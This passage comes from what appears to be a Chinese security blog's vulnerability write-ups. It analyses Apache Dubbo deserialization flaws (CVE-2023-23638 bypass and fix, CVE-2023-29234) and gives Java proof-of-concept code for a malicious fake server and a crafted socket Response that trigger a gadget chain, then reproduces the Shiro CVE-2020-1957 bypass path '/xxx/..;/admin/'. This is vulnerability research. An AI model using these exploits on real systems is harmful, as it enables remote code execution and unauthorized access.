+<li>map (这里面可用于设置 generic key)<br>之后会去执行 <code>org.apache.dubbo.remoting.exchange.support.header.HeaderExchangeHandler#received</code> ，这里关注到 <code>message</code> 参数类型当前为 Request 类，因此会走第一个分支（后续会关注到 Response 分支部分）。</li>
+</ul>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/6.png" alt="image"></p>
+<p>观察到刚才解析得到的各个参数值位于 <code>message</code> 的 <code>mData</code> 字段。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/7.png" alt="image"></p>
+<p>第一个分支当中会再次取出 <code>mData</code> 的字段值转化为 <code>RpcInvocation</code> 类实例，并调用 <code>org.apache.dubbo.remoting.exchange.support.ExchangeHandlerAdapter#received</code> 方法，进一步调用 <code>reply</code> 。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/8.png" alt="image"></p>
+<p>之后就会触发一系列 Filter 的 invoke 方法，调用栈如下：</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/9.png" alt="image"></p>
+<p>关键 filter 函数是 <code>org.apache.dubbo.rpc.filter.GenericFilter#invoke</code> ，再次判断是否为泛型引用之后，会根据 <code>inv</code> 中提供的方法名从 dubbo 服务中找到对应方法，并取出参数类型和具体的参数值。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/10.png" alt="image"></p>
+<p>中间会从 <code>inv</code> 的 <code>attachments</code> 中取出 key 为 <code>generic</code> 的值，这个 <code>generic</code> 代表不同的反序列化策略，除 raw.return 外还有 nativejava、bean、protobuf-json 等。</p>
+</blockquote>
+<h4><span id="rawreturn-反序列化方式分析">raw.return 反序列化方式分析</span></h4><blockquote>
+<p>这里如果值为 <code>raw.return</code> ，则会调用 <code>PojoUtils.realize</code> 方法，接着会对每个 args 值调用 <code>realize0</code> 方法，如果这个 arg 属于 Map 类型，则取出 class 键值，并使用 <code>ClassUtils.forName</code> 方法，其中会对传入的 className 使用应用类加载器进行类加载。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/11.png" alt="image"></p>
+<p>之后对于加载的 class 调用 <code>newInstance</code> 进行实例化。这里首先会去调用 class 默认的 public 构造函数，如果无法访问则会去遍历所有的构造器，优先获取<strong>参数个数为 0 的构造函数</strong>并反射调用。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/12.png" alt="image"></p>
+<p>之后便是漏洞的一大利用点，它针对 HashMap 当中剩下的键值，先尝试获取 key 在实例化 class 当中对应 field 的 setter 方法（要求为单参数），如果可以获取到的话。会用和刚才相同的逻辑递归实例化参数值，并反射调用；如果获取不到 setter 方法，则直接反射设置 field 的值。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/13.png" alt="image"></p>
+<p>因此针对 <code>raw.return</code> 反序列化方式的利用是通过 Map 的方式来传入利用 class，可利用 class 的位置有 3 个：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">public</span>/<span class="keyword">private</span> 修饰的无参构造函数</span><br><span class="line"><span class="number">2.</span> 参数为 <span class="number">1</span> 的 setter 方法</span><br><span class="line"><span class="number">3.</span> 支持对实例化的 class 任意字段赋值</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4><span id="bean-反序列化方式分析">bean 反序列化方式分析</span></h4><blockquote>
+<p>这里会先遍历判断每个参数值是否为 <code>JavaBeanDescriptor</code> 类型，如果是则调用 <code>JavaBeanSerializeUtil.deserialize</code> 方法。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/14.png" alt="image"></p>
+<p>后面会调用到 <code>instantiateForDeserialize</code> 实例化方法，其中调用<code>name2Class</code> 方法中的 <code>Class.forName</code> 进行类加载，然后 <code>instatiate</code> 实例化。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/15.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/16.png" alt="image"></p>
+<p>之后 <code>deserializeInternal</code> ，与 raw.return 的利用思路类似，如果 <code>beanDescriptor</code> 实例的 type 等于 <code>TYPE_BEAN</code> 的话则会依次执行指定 key 字段的 setter 方法或者反射为字段赋值。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/17.png" alt="image"></p>
+<p><strong>PS</strong>：其中 type 可以通过构造 <code>beanDescriptor</code> 实例时设置。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/18.png" alt="image"></p>
+</blockquote>
+<h4><span id="native-反序列化方式">native 反序列化方式</span></h4><blockquote>
+<p>这个利用比较特殊，需要配置中开启 <code>dubbo.security.serialize.generic.native-java-enable</code> 选项才能使用。<br>这里如果参数值为 byte[] 数组的话，则会传入 <code>UnsafeByteArrayInputStream</code> 构造函数当中，后加载并调用 <code>NativeJavaObjectInput</code> 的 <code>deserialize</code> 方法。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/19.png" alt="image"></p>
+<p>该类的 inputStream 字段封装了 ObjectInputStream 输入流，最终反序列化时也会调用的是后者，因此可触发二次反序列化。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/20.png" alt="image"></p>
+</blockquote>
+<h2><span id="cve-2023-23638-学习-bypass-思路">CVE-2023-23638 （学习 bypass 思路）</span></h2><blockquote>
+<p>受影响版本：Apache Dubbo 3.0.x &lt;&#x3D; 3.0.13；3.1.x &lt;&#x3D; 3.1.5<br>前版本 diff 分析<br><code>org.apache.dubbo.rpc.filter.GenericFilter#invoke</code> 方法当中，会对每个 args 值调用 <code>realize0</code> 方法，如果这个 arg 属于 Map 类型，则取出 class 键值，调用 <code>SerializeClassChecker.getInstance().validateClass</code> ，里面会作黑名单检查。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/21.png" alt="image"></p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/22.png" alt="image"></p>
+</blockquote>
+<h3><span id="bypass-思路">bypass 思路</span></h3><h4><span id="native-反序列化方式">native 反序列化方式</span></h4><blockquote>
+<p>这个反序列化方式可以让我们触发一个二次反序列化，从而绕过上述安全检查。但是困难点在于 <code>dubbo.security.serialize.generic.native-java-enable</code> 选项默认未开启，因此利用思路就是寻找如何将它打开。<br>于是这个 <code>org.apache.dubbo.common.utils.ConfigUtils#setProperties</code> 方法就十分有用，利用它可将<code>CommonConstants.ENABLE_NATIVE_JAVA_GENERIC_SERIALIZE</code> 属性设置为 true 即可。当然从 dubbo 的源码中可知 <code>System.setProperties</code> 也是可以直接设置 dubbo 服务属性的。<br>因此绕过部分的 map 就可以写成：</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/23.png" alt="image"></p>
+</blockquote>
+<h4><span id="rawreturn-反序列化方式">raw.return 反序列化方式</span></h4><blockquote>
+<p>将 <code>SerializeClassChecker</code> 类的 <code>CLASS_DESERIALIZE_BLOCKED_SET</code> 置空或者 <code>OPEN_CHECK_CLASS</code> 设置为 false，这个类实例的获取方式为单例模式，因此需要控制 <code>INSTANCE</code> 字段为上面指定的实例。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/24.png" alt="image"></p>
+<p>绕过部分的 map 可以写成：</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/25.png" alt="image"></p>
+</blockquote>
+<h3><span id="修复方案">修复方案</span></h3><blockquote>
+<p>新增 <code>SerializeClassChecker</code> 类检查器，其中指定了 <code>dubbo.application.check-serializable</code> 默认为 true。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/26.png" alt="image"></p>
+<p>其中的 <code>validateClass</code> 方法会检查指定反序列化类是否可序列化。这个方法会在 <code>realize0</code> 中调用。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/27.png" alt="image"></p>
+<p>之前需要用来设置属性的利用类 <code>org.apache.dubbo.common.utils.ConfigUtils</code> 以及 <code>java.lang.System</code> 均未实现序列化接口，因此不再可利用；同样，<code>org.apache.dubbo.common.utils.SerializeClassChecker</code> 也未实现序列化接口，无法覆盖其相关检查字段。</p>
+</blockquote>
+<h2><span id="cve-2023-29234-1day">CVE-2023-29234 （1day）</span></h2><blockquote>
+<p>受影响版本：</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/28.png" alt="image"></p>
+<p>git diff: <a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/commit/9ae97ea053dad758a0346a9acda4fbc8ea01429a">https://github.com/apache/dubbo/commit/9ae97ea053dad758a0346a9acda4fbc8ea01429a</a><br><code>org.apache.dubbo.common.serialize.ObjectInput#readThrowable</code> 方法抛出异常的地方作了修改，而之前版本会直接打印 obj 对象，隐式触发 <code>toString</code> 方法，漏洞场景类似 CVE-2021-43297。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/29.png" alt="image"></p>
+<p>反向溯源调用位置，位于该函数的 switch-case 语句的 DubboCodec.RESPONSE_WITH_EXCEPTION 分支处调用 <code>org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcResult#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)</code></p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/30.png" alt="image"></p>
+<p>调用链如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcResult#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)</span><br><span class="line">    ---&gt;</span><br><span class="line">        handleException()</span><br><span class="line">            ---&gt;</span><br><span class="line">                ObjectInput.readThrowable()</span><br><span class="line">                    ---&gt;</span><br><span class="line">                        obj.toString()</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/vivo_tech/article/details/115633937">Dubbo 编解码那些事_decodeablerpcresult-CSDN博客</a> 可知 <code>DecodeableRpcResult</code> 这个类是在 dubbo 服务的消费者接收提供者方发来的响应时解码使用。</p>
+</blockquote>
+<h4><span id="利用方式一fake-server">利用方式一：fake server</span></h4><blockquote>
+<p>测试版本：Apache Dubbo 3.1.10<br>我们知道 dubbo 支持多种序列化方式，对于 dubbo 协议来说默认为 hessian2，其他如下所示（hessian2 对应 id 为 2，也可以通过 <code>Serialization.getContentTypeId()</code> 获得）</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/31.png" alt="image"></p>
+<p>由官方文档可知，这个协议如何配置完全由服务方定的，因此完全可以做一个 fake server 来诱导客户端主动连接。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/32.png" alt="image"></p>
+<p>因此我们可以重写服务端编码响应信息函数的部分逻辑，主动构造一个用于上面提到的 toString 调用链对象来替代 Throwable 实例 th。<br>具体重写位置在 <code>org.apache.dubbo.rpc.protocol.dubbo.DubboCodec#encodeResponseData(org.apache.dubbo.remoting.Channel, org.apache.dubbo.common.serialize.ObjectOutput, java.lang.Object, java.lang.String)</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">encodeResponseData</span><span class="params">(Channel channel, ObjectOutput out, Object data, String version)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Result</span> <span class="variable">result</span> <span class="operator">=</span> (Result) data;</span><br><span class="line">        <span class="comment">// currently, the version value in Response records the version of Request</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">attach</span> <span class="operator">=</span> Version.isSupportResponseAttachment(version);</span><br><span class="line"><span class="comment">//         Throwable th = result.getException();   </span></span><br><span class="line">         <span class="type">Object</span> <span class="variable">th</span> <span class="operator">=</span> <span class="literal">null</span>;  <span class="comment">// 利用点： 用于 toString 的 gadget chain</span></span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">                th = getThrowablePayload(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (th == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">ret</span> <span class="operator">=</span> result.getValue();</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">                out.writeByte(attach ? RESPONSE_NULL_VALUE_WITH_ATTACHMENTS : RESPONSE_NULL_VALUE);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                out.writeByte(attach ? RESPONSE_VALUE_WITH_ATTACHMENTS : RESPONSE_VALUE);   </span><br><span class="line">                out.writeObject(ret);   </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            out.writeByte(attach ? RESPONSE_WITH_EXCEPTION_WITH_ATTACHMENTS : RESPONSE_WITH_EXCEPTION);</span><br><span class="line"><span class="comment">//            out.writeThrowable(th); </span></span><br><span class="line">            out.writeObject(th);    <span class="comment">// 直接序列化对象即可</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (attach) &#123;</span><br><span class="line">            <span class="comment">// returns current version of Response to consumer side.</span></span><br><span class="line">            result.getObjectAttachments().put(DUBBO_VERSION_KEY, Version.getProtocolVersion());</span><br><span class="line">            out.writeAttachments(result.getObjectAttachments());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的 toString 调用链以 Rome toString 的利用部分为例，师傅们也可以选择&#x2F;挖掘其他可利用的 gadget；同时，为了方便这里直接指定服务端的协议配置中的序列化方式为 nativejava，它反序列化时直接会使用 <code>ObjectInputStream#readObject</code> 。大家也可以探索一下其他序列化方式当中的黑名单绕过情况。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dubbo:protocol</span> <span class="attr">name</span>=<span class="string">&quot;dubbo&quot;</span> <span class="attr">port</span>=<span class="string">&quot;20880&quot;</span> <span class="attr">serialization</span>=<span class="string">&quot;nativejava&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>客户端发起正常服务请求后，解码响应信息时顺利触发至 <code>org.apache.dubbo.common.serialize.ObjectInput#readThrowable</code> 位置，状态如下：</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/33.png" alt="image"></p>
+</blockquote>
+<h4><span id="利用方式二客户端打服务端">利用方式二：客户端打服务端</span></h4><blockquote>
+<p>测试版本：3.1.5<br>由于 dubbo 并没有限制客户端不能发送 Response 数据，因此客户端同样可以构造一个 Response 信息发给服务端。<br>但是在服务端解码响应信息时，即函数调用位置为 <code>org.apache.dubbo.rpc.protocol.dubbo.DubboCodec#decodeBody</code>，不同版本之间存在差异性，这里测试了一下 3.1.10 以及 3.1.5 之间的区别。<br>首先是 3.1.5 版本，注意到在创建 <code>DecodeableRpcResult</code> 实例时，其中一个构造参数 <code>invocation</code> 来自于 <code>getRequestData(id)</code></p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/34.png" alt="image"></p>
+<p>跟入可知这个 <code>invocation</code> 来自于 dubbo 服务当中还没处理完毕的请求，会根据 id 值来获取，而由于我们这里只发送了一个 Response 信息，<code>DefaultFuture</code> 当中的 <code>FUTURES</code> map 为空，这里也就会返回 null。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/35.png" alt="image"></p>
+<p>但是依然可以将 <code>DecodeableRpcResult</code> 实例构造出来，并设置到 <code>res</code> 变量的 <code>mResult</code> 字段当中。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/36.png" alt="image"></p>
+<p>后续在触发到 toString 入口的过程中，不会因为 <code>mResult</code> 字段为 null 或者非 <code>Decodeable</code> 类而中断（<code>DecodeableRpcResult</code> 是 <code>Decodeable</code> 的实现）。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/37.png" alt="image"></p>
+<p>而对于 3.1.10 版本，<code>getRequestData</code> 方法如果获取不到 <code>future</code> 会直接抛出异常，进而无法创建出有效的 <code>DecodeableRpcResult</code> 实例。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/38.png" alt="image"></p>
+<p>进而，后续 <code>message</code> 参数会由于是 null 而直接返回。</p>
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/39.png" alt="image"></p>
+<p>这里给出 3.1.5 版本下的测试 POC 核心部分：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">boos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">nativeJavaBoos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Serialization</span> <span class="variable">serialization</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeJavaSerialization</span>();</span><br><span class="line">        <span class="type">NativeJavaObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NativeJavaObjectOutput</span>(nativeJavaBoos);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// header.</span></span><br><span class="line">        <span class="type">byte</span>[] header = <span class="keyword">new</span> <span class="title class_">byte</span>[HEADER_LENGTH];</span><br><span class="line">        <span class="comment">// set magic number.</span></span><br><span class="line">        Bytes.short2bytes(MAGIC, header);</span><br><span class="line">        <span class="comment">// set request and serialization flag.</span></span><br><span class="line">        header[<span class="number">2</span>] = serialization.getContentTypeId();</span><br><span class="line"></span><br><span class="line">        header[<span class="number">3</span>] = Response.OK;</span><br><span class="line">        Bytes.long2bytes(<span class="number">1</span>, header, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// result</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">exp</span> <span class="operator">=</span> getThrowablePayload(<span class="string">&quot;open -a calculator&quot;</span>); <span class="comment">// Rome toString 利用链</span></span><br><span class="line">        out.writeByte(RESPONSE_WITH_EXCEPTION);</span><br><span class="line">        out.writeObject(exp);</span><br><span class="line"></span><br><span class="line">        out.flushBuffer();</span><br><span class="line"></span><br><span class="line">        Bytes.int2bytes(nativeJavaBoos.size(), header, <span class="number">12</span>);</span><br><span class="line">        boos.write(header);</span><br><span class="line">        boos.write(nativeJavaBoos.toByteArray());</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] responseData = boos.toByteArray();</span><br><span class="line"></span><br><span class="line">        <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">20880</span>);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        outputStream.write(responseData);</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">getThrowablePayload</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">delegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, o);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> delegate;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/23/CVE-2023-29234-Apache-Dubbo/40.png" alt="image"></p>
+<p>完整 POC 项目基于 <a target="_blank" rel="noopener" href="https://github.com/lz2y/DubboPOC/blob/main/src/main/java/top/lz2y/vul/CVE202323638.java">DubboPOC</a> 作的修改和添加，可见 <a target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting/DubboPOC">CVE-2023-29234</a><br><strong>PS：</strong>git diff 当中还存在其他位置的 patch，值得进一步探索其他的利用方式（篇幅有限）。</p>
+</blockquote>
+<h2><span id="引用">引用</span></h2><blockquote>
+<p>[1] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12396">Apache dubbo 反序列化漏洞（CVE-2023-23638）分析及利用探索 - 先知社区 (aliyun.com)</a><br>[2] <a target="_blank" rel="noopener" href="https://lists.apache.org/thread/wb2df2whkdnbgp54nnqn0m94rllx8f77">CVE-2023-29234: Bypass serialize checks in Apache Dubbo-Apache Mail Archives</a><br>[3] <a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/">开发服务 | Apache Dubbo</a><br>[4] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12333">Apache Dubbo CVE-2023-23638 JavaNative 反序列化漏洞分析 - 先知社区 (aliyun.com)</a><br>[5] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vHJpE2fZ8Lne-xFggoQiAg">【漏洞分析】Dubbo Pre-auth RCE（CVE-2021-30179） (qq.com)</a><br>[6] <a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/docs/concepts/rpc-protocol/">RPC 通信协议 | Apache Dubbo</a><br>[7] <a target="_blank" rel="noopener" href="https://github.com/lz2y/DubboPOC/blob/main/src/main/java/top/lz2y/vul/CVE202323638.java">DubboPOC&#x2F;src&#x2F;main&#x2F;java&#x2F;top&#x2F;lz2y&#x2F;vul&#x2F;CVE202323638.java at main · lz2y&#x2F;DubboPOC (github.com)</a><br>[8] <a target="_blank" rel="noopener" href="https://github.com/y1ong/blog-timeline/issues/334">Apache Dubbo 反序列化漏洞（CVE-2023-29234） · Issue #334 · y1ong&#x2F;blog-timeline (github.com)</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/CVE-2020-1957-Apache-Shiro/">
+                Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-shiro-认证绕过漏洞-cve-2020-1957-漏洞复现">Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/119105197">Senimo_</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>CVE-2020-1957，Spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><h3><span id="环境搭建">环境搭建</span></h3><blockquote>
+<p>执行如下命令启动一个搭载Spring 2.2.2与Shiro 1.5.1的应用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/shiro/CVE-2020-1957</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>环境启动后，访问<code>http://x.x.x.x:8080</code>即可查看首页:</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/1.png" alt="image"></p>
+<p>这个应用中对URL权限的配置如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ShiroFilterChainDefinition <span class="title function_">shiroFilterChainDefinition</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">DefaultShiroFilterChainDefinition</span> <span class="variable">chainDefinition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultShiroFilterChainDefinition</span>();</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/login.html&quot;</span>, <span class="string">&quot;authc&quot;</span>); <span class="comment">// need to accept POSTs from the login form</span></span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/logout&quot;</span>, <span class="string">&quot;logout&quot;</span>);</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> chainDefinition;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="漏洞复现">漏洞复现</span></h3><blockquote>
+<p>使用BurpSuite抓取数据包，访问<code>/admin/</code>目录：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/2.png" alt="image"></p>
+<p>回显<code>302</code>并跳转到登录页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/3.png" alt="image"></p>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/4.png" alt="image"></p>
+<p>URL请求过程：</p>
+<ul>
+<li>客户端请求URL: <code>/xxx/..;/admin/</code></li>
+<li>Shrio 内部处理得到校验URL为 <code>/xxxx/..</code>,校验通过</li>
+<li>SpringBoot 处理 <code>/xxx/..;/admin/</code> , 最终请求 <code>/admin/</code>, 成功访问了后台请求。</li>
+</ul>
+</blockquote>
+<h2><span id="漏洞poc">漏洞POC</span></h2><blockquote>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.safedog.cn/news.html?id=4441">https://www.safedog.cn/news.html?id=4441</a><br><a target="_blank" rel="noopener" href="https://blog.spoock.com/2020/05/09/cve-2020-1957/">https://blog.spoock.com/2020/05/09/cve-2020-1957/</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/CVE-2020-13945-Apache-APISIX/">
